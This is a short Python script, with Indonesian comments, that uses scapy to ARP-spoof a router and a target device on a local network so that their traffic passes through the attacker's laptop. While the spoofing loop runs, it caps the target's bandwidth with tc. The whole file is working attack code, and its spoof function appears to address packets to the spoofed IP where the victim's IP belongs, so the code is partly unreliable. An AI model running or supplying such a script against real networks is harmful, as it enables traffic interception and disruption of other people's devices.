import time, sys, os
from scapy.all import ARP, Ether, send, srp

# Konfigurasi
gateway_ip = "192.168.1.1"  # IP Router
target_ip = "192.168.1.6"  # IP Hp Saya
interface = "wlxd46e0e0afd07"  # donggle laptop saya

def get_mac(ip):
    """Mendapatkan MAC Address dari IP Hp Saya"""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
    for sent, received in ans:
        return received.hwsrc
    return None

def spoof(target_mac, spoof_ip):
    """Mengirim paket ARP Spoofing"""
    packet = ARP(op=2, pdst=spoof_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_mac, spoof_ip, gateway_mac):
    """Mengembalikan ARP Table ke kondisi awal"""
    packet = ARP(op=2, pdst=spoof_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=gateway_mac)
    send(packet, count=4, verbose=False)

def limit_bandwidth(interface, target_mac, rate):
    """Membatasi bandwidth"""
    print(f"[*] Menerapkan limit bandwidth {rate} untuk {target_mac}")
    os.system(f"sudo tc qdisc add dev {interface} root handle 1: htb default 30")
    os.system(f"sudo tc class add dev {interface} parent 1: classid 1:1 htb rate {rate}")
    os.system(f"sudo tc filter add dev {interface} protocol ip parent 1:0 prio 1 u32 match ether dst {target_mac} flowid 1:1")

def clear_bandwidth_limit(interface):
    """Menghapus limit bandwidth"""
    print("[*] Menghapus limit bandwidth...")
    os.system(f"sudo tc qdisc show dev {interface}")  # Debugging
    os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")

try:
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if target_mac is None or gateway_mac is None:
        print("[!] Gagal mendapatkan MAC Address!")
        sys.exit(1)

    rate_limit = int(input("Masukkan limit bandwidth untuk target (kbit): ").strip())
    if rate_limit < 1:
        print("[!] Limit bandwidth harus lebih dari 0!")
        sys.exit(1)
    rate_limit = f"{rate_limit}kbit"

    limit_bandwidth(interface, target_mac, rate_limit)

    print("[*] Menjalankan ARP Spoofing...")
    while True:
        spoof(target_mac, gateway_ip)  # Buat korban menganggap kita sebagai gateway
        spoof(gateway_mac, target_ip)  # Buat router menganggap kita sebagai korban
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Mengembalikan ARP Table dan menghapus limit bandwidth...")
    restore(target_mac, gateway_ip, gateway_mac)
    restore(gateway_mac, target_ip, target_mac)
    clear_bandwidth_limit(interface)
    print("[!] ARP Table berhasil dikembalikan")
    sys.exit(0)
